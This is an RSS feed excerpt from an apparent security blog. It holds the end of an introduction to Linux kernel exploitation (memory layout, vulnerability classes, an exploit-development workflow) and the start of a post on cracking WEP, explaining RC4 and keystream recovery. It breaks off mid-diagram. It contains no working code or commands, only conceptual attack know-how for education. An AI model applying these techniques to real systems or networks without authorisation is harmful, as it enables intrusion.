 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;The Linux kernel’s memory is organized into several segments, each serving a different purpose:&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Segment&lt;/th&gt;
 &lt;th&gt;Description&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Text (code)&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Contains the executable instructions of the kernel itself&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Data&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Holds global variables and static data, both initialized and uninitialized&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Heap&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Area used for dynamic memory allocations within the kernel&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Stack&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Used for per-thread function calls, local variables, and return addresses&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;To increase security, modern kernels implement protections like &lt;strong&gt;Kernel Address Space Layout Randomization (KASLR)&lt;/strong&gt;, which randomizes the locations of these memory segments at boot time. This makes it much harder for attackers to predict where critical kernel code or data reside, complicating exploitation attempts.&lt;/p&gt;
&lt;p&gt;The text segment holds executable code and is often targeted for code injection or modification. The data and heap segments are frequent targets for overflow or corruption attacks. The stack is critical for control flow and vulnerable to buffer overflows and return-oriented programming (ROP) attacks.&lt;/p&gt;
&lt;h3 class="heading-element" id="common-kernel-vulnerabilities"&gt;&lt;span&gt;27.5 Common Kernel Vulnerabilities&lt;/span&gt;
 &lt;a href="#common-kernel-vulnerabilities" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;The kernel, despite its protections, can have bugs that lead to vulnerabilities. Some of the most common types include:&lt;/p&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Vulnerability&lt;/th&gt;
 &lt;th&gt;Description&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Buffer Overflow&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Occurs when data is written beyond the bounds of a buffer, potentially overwriting important control data or code pointers. This can lead to arbitrary code execution.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Use-After-Free&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Happens when the kernel accesses memory that has already been freed, leading to undefined behavior or exploitation opportunities.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Race Conditions&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Arise when multiple threads or processes access shared resources simultaneously, causing inconsistent or unexpected states that attackers can exploit.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;strong&gt;Integer Overflows&lt;/strong&gt;&lt;/td&gt;
 &lt;td&gt;Errors in arithmetic calculations can result in incorrect memory size computations, leading to memory corruption or buffer overflows.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Understanding these vulnerabilities is key to developing kernel exploits and also to designing better defenses.&lt;/p&gt;
&lt;h3 class="heading-element" id="kernel-modules"&gt;&lt;span&gt;27.6 Kernel Modules&lt;/span&gt;
 &lt;a href="#kernel-modules" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Kernel modules are pieces of code—often device drivers or filesystem drivers—that can be dynamically loaded and unloaded into the kernel at runtime.&lt;/p&gt;
&lt;p&gt;Since modules run with full kernel privileges, any flaw or bug in their code can directly compromise the entire system. Poorly written or malicious modules are frequent sources of kernel vulnerabilities and exploitation vectors.&lt;/p&gt;
&lt;pre class="mermaid"&gt;graph LR
 Kernel["Kernel Space"]
 Module["Kernel Module"]
 Hardware["Hardware Device"]
 UserApp["User Application"]

 UserApp --&gt;|Syscalls| Kernel
 Kernel --&gt;|Loads| Module
 Module --&gt;|Controls| Hardware
 Module --&gt;|Calls Kernel APIs| Kernel&lt;/pre&gt;
&lt;template&gt;graph LR
 Kernel["Kernel Space"]
 Module["Kernel Module"]
 Hardware["Hardware Device"]
 UserApp["User Application"]

 UserApp --&gt;|Syscalls| Kernel
 Kernel --&gt;|Loads| Module
 Module --&gt;|Controls| Hardware
 Module --&gt;|Calls Kernel APIs| Kernel&lt;/template&gt;&lt;h3 class="heading-element" id="exploit-development-workflow"&gt;&lt;span&gt;27.7 Exploit Development Workflow&lt;/span&gt;
 &lt;a href="#exploit-development-workflow" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Developing a kernel exploit typically follows a multi-step process:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Vulnerability Discovery&lt;/strong&gt;&lt;br&gt;
Finding bugs via code auditing, fuzzing, or analyzing kernel crash reports.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Proof of Concept (PoC)&lt;/strong&gt;&lt;br&gt;
Creating a minimal piece of code that reliably triggers the vulnerability to confirm its existence.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Exploit Development&lt;/strong&gt;&lt;br&gt;
Crafting a payload that leverages the bug to escalate privileges, usually from user space (ring 3) to kernel space (ring 0).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Bypassing Protections&lt;/strong&gt;&lt;br&gt;
Implementing techniques to circumvent kernel defenses such as KASLR, SMEP/SMAP (Supervisor Mode Execution/Access Prevention), and stack canaries.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Payload Execution&lt;/strong&gt;&lt;br&gt;
Running the final payload with kernel-level privileges to achieve goals like root shell access or kernel memory manipulation.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 class="heading-element" id="stack--heap"&gt;&lt;span&gt;27.7.1 Stack &amp;amp; Heap&lt;/span&gt;
 &lt;a href="#stack--heap" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Stack&lt;/strong&gt;: Used for managing function calls and local variables. Vulnerabilities like stack buffer overflows are common.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Heap&lt;/strong&gt;: A dynamic memory region for allocating objects at runtime. Heap corruption is another common exploitation vector.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 class="heading-element" id="device-driver"&gt;&lt;span&gt;27.7.2 Device Driver&lt;/span&gt;
 &lt;a href="#device-driver" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;A &lt;strong&gt;device driver&lt;/strong&gt; is kernel code that allows the OS to interface with hardware (e.g., network cards, USB devices). Poorly written drivers are a &lt;strong&gt;frequent source of kernel vulnerabilities&lt;/strong&gt;.&lt;/p&gt;
&lt;h4 class="heading-element" id="context-switch"&gt;&lt;span&gt;27.7.3 Context Switch&lt;/span&gt;
 &lt;a href="#context-switch" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;p&gt;A &lt;strong&gt;context switch&lt;/strong&gt; occurs when the CPU changes from executing one process to another. The kernel is responsible for this operation, and it involves saving and restoring process states.&lt;/p&gt;
&lt;h2 class="heading-element" id="conclusion"&gt;&lt;span&gt;28 Conclusion&lt;/span&gt;
 &lt;a href="#conclusion" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In this first part, we explored the foundational concepts of the Linux kernel, its memory layout, key defense mechanisms, and common vulnerabilities that affect this critical part of the system.&lt;/p&gt;
&lt;p&gt;Understanding these basics is essential for anyone looking to dive into kernel exploitation, as they shape how attacks are crafted and defenses bypassed.&lt;/p&gt;
&lt;p&gt;In the upcoming parts, we will dive into practical exploitation examples, setting up a safe testing environment, and techniques to analyze and circumvent kernel protections.&lt;/p&gt;</description></item><item><title>Wireless Hacking Part 3</title><link>https://Pr0xyG33k.github.io/posts/wireless03/</link><pubDate>Mon, 26 May 2025 17:05:48 +0200</pubDate><author>1024@Pr0xyG33k.github.io (ProxyGeek)</author><guid>https://Pr0xyG33k.github.io/posts/wireless03/</guid><category domain="https://Pr0xyG33k.github.io/categories/guides/">Guides</category><description>&lt;h2 class="heading-element" id="about"&gt;&lt;span&gt;25 About&lt;/span&gt;
 &lt;a href="#about" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;In Part 3 of our Wireless Hacking series, we will delve into the practical application of wireless attacks. After exploring the basics of Wi-Fi and setting up a safe testing environment, it’s time to get hands-on. In this post, we’ll focus on attacking WEP (Wired Equivalent Privacy) — a once-standard but now outdated and highly vulnerable wireless encryption protocol.&lt;/p&gt;
&lt;p&gt;In this post, you’ll learn how WEP works, the cryptographic weaknesses it suffers from, and step-by-step how to exploit these flaws using tools like &lt;strong&gt;aircrack-ng&lt;/strong&gt; and &lt;strong&gt;aireplay-ng&lt;/strong&gt;. By the end, you’ll understand why WEP is obsolete and how attackers can recover a WEP key within minutes.&lt;/p&gt;
&lt;div class="alert alert-caution"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M4.47.22A.749.749.0 015 0h6c.199.0.389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749.0 01-.22.53l-4.25 4.25A.749.749.0 0111 16H5a.749.749.0 01-.53-.22L.22 11.53A.749.749.0 010 11V5c0-.199.079-.389.22-.53zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5zM8 4a.75.75.0 01.75.75v3.5a.75.75.0 01-1.5.0v-3.5A.75.75.0 018 4zm0 8a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Caution&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Ethical Hacking Reminder&lt;/strong&gt;: Only perform wireless penetration tests on networks you own or have explicit permission to test. Unauthorized hacking is illegal and unethical.&lt;/p&gt;&lt;/div&gt;&lt;h2 class="heading-element" id="rc4-stream-cipher"&gt;&lt;span&gt;26 RC4/ Stream Cipher&lt;/span&gt;
 &lt;a href="#rc4-stream-cipher" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;The process starts when the user creates a root key of size 128 bits. This root key is then encrypted using the RC4 algorithm, which generates a keystream. Once the keystream is generated, it is combined with the plaintext data using an XOR gate (logical operation). The result of this operation gives us the &lt;strong&gt;ciphertext&lt;/strong&gt;, which can then be sent.&lt;/p&gt;
&lt;pre class="mermaid"&gt;graph TD
 RootKey["Root Key (128 bits)"]
 RC4["RC4 Algorithm"]
 Keystream["Keystream&lt;br&gt;(Generated by RC4)"]
 Plaintext["Plaintext Data"]
 XOR["XOR Operation"]
 Ciphertext["Ciphertext&lt;br&gt;(Output)"]

 RootKey --&gt; RC4
 RC4 --&gt; Keystream
 Keystream --&gt; XOR
 Plaintext --&gt; XOR
 XOR --&gt; Ciphertext&lt;/pre&gt;
&lt;template&gt;graph TD
 RootKey["Root Key (128 bits)"]
 RC4["RC4 Algorithm"]
 Keystream["Keystream&lt;br&gt;(Generated by RC4)"]
 Plaintext["Plaintext Data"]
 XOR["XOR Operation"]
 Ciphertext["Ciphertext&lt;br&gt;(Output)"]

 RootKey --&gt; RC4
 RC4 --&gt; Keystream
 Keystream --&gt; XOR
 Plaintext --&gt; XOR
 XOR --&gt; Ciphertext&lt;/template&gt;&lt;h2 class="heading-element" id="wep-packet"&gt;&lt;span&gt;27 WEP Packet&lt;/span&gt;
 &lt;a href="#wep-packet" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;The process of sending a packet using WEP begins with appending a 24-bit Initialization Vector (IV) to the root key. This new combined key is then input into the RC4 encryption algorithm, which generates a keystream unique to that packet. Next, this keystream is combined with the plaintext data using an XOR operation, producing the ciphertext that will be transmitted over the wireless network.&lt;/p&gt;
&lt;p&gt;Since the IV changes with every packet, it is appended along with the ciphertext. This is necessary because the receiving device (such as a router) needs the IV to recreate the same keystream and correctly decrypt the message. Without the IV, decryption would not be possible, as the key would not match the keystream used for encryption.&lt;/p&gt;
&lt;pre class="mermaid"&gt;graph TD
 RootKey["Root Key (128 bits)"]
 IV["IV (24 bits)"]
 RC4["RC4 Algorithm"]
 Keystream["Keystream:&lt;br&gt;1101101010110010101&lt;br&gt;1001010110010101"]
 Plaintext["Plain Text:\nGET / HTTP 1.1\nHost: google.com"]
 XOR["XOR Operation"]
 Ciphertext["Ciphertext:\na1b2c3d4e5f67890=="]

 RootKey --&gt; RC4
 IV --&gt; RC4
 RC4 --&gt; Keystream
 Keystream --&gt; XOR
 Plaintext --&gt; XOR
 XOR --&gt; Ciphertext&lt;/pre&gt;
&lt;template&gt;graph TD
 RootKey["Root Key (128 bits)"]
 IV["IV (24 bits)"]
 RC4["RC4 Algorithm"]
 Keystream["Keystream:&lt;br&gt;1101101010110010101&lt;br&gt;1001010110010101"]
 Plaintext["Plain Text:\nGET / HTTP 1.1\nHost: google.com"]
 XOR["XOR Operation"]
 Ciphertext["Ciphertext:\na1b2c3d4e5f67890=="]

 RootKey --&gt; RC4
 IV --&gt; RC4
 RC4 --&gt; Keystream
 Keystream --&gt; XOR
 Plaintext --&gt; XOR
 XOR --&gt; Ciphertext&lt;/template&gt;&lt;h2 class="heading-element" id="router-side-decryption"&gt;&lt;span&gt;28 Router-side Decryption&lt;/span&gt;
 &lt;a href="#router-side-decryption" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;During router-side decryption, the process begins by appending the root key with the 24-bit Initialization Vector (IV) extracted from the received data packet. This new key is then used as input to the RC4 algorithm, which generates a pseudorandom keystream. Next, this keystream is combined with the ciphertext using an XOR operation.&lt;/p&gt;
&lt;pre class="mermaid"&gt;graph TD
 RootKey["Root Key (128 bits)"]
 IV["IV (24 bits)"]
 RC4["RC4 Algorithm"]
 Keystream["Keystream:&lt;br&gt;1101101010110010101&lt;br&gt;1001010110010101"]
 XOR["XOR Operation"]
 Ciphertext["Ciphertext:\na1b2c3d4e5f67890=="]
 Plaintext["Plain Text:\nGET / HTTP 1.1\nHost: google.com"]

 RootKey --&gt; RC4
 IV --&gt; RC4
 RC4 --&gt; Keystream
 Keystream --&gt; XOR
 Ciphertext --&gt; XOR
 XOR --&gt; Plaintext&lt;/pre&gt;
&lt;template&gt;graph TD
 RootKey["Root Key (128 bits)"]
 IV["IV (24 bits)"]
 RC4["RC4 Algorithm"]
 Keystream["Keystream:&lt;br&gt;1101101010110010101&lt;br&gt;1001010110010101"]
 XOR["XOR Operation"]
 Ciphertext["Ciphertext:\na1b2c3d4e5f67890=="]
 Plaintext["Plain Text:\nGET / HTTP 1.1\nHost: google.com"]

 RootKey --&gt; RC4
 IV --&gt; RC4
 RC4 --&gt; Keystream
 Keystream --&gt; XOR
 Ciphertext --&gt; XOR
 XOR --&gt; Plaintext&lt;/template&gt;&lt;p&gt;The result is the original data stream requested by the device. However, it is important to note that the mathematical weaknesses of RC4 expose this method to vulnerabilities: by collecting enough keystreams associated with different IV values, an attacker can analyze the data to recover the network’s secret key.&lt;/p&gt;
&lt;h2 class="heading-element" id="methodology"&gt;&lt;span&gt;29 Methodology&lt;/span&gt;
 &lt;a href="#methodology" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;Cracking a wireless network — especially one secured with WEP — relies on a deep understanding of stream cipher mechanics. At the heart of this process is the extraction of a keystream, a pseudorandom sequence used to encrypt data. To obtain the keystream, you need both ciphertext and at least a portion of the plaintext. By XORing the two, the keystream can be revealed, which can then be reused to decrypt other packets or even recover the original WEP key.&lt;/p&gt;
&lt;pre class="mermaid"&gt;graph TD
 Ciphertext["Ciphertext: na1b2c3d4e5f67890=="]
 PlainText["Plain Text: GET / HTTP 1.1\nHost: google.com"]
 XOR["XOR Operation"]
 Keystream["Keystream:&lt;br&gt;1101101010110010101&lt;br&gt;1001010110010101"]

 Ciphertext --&gt; XOR
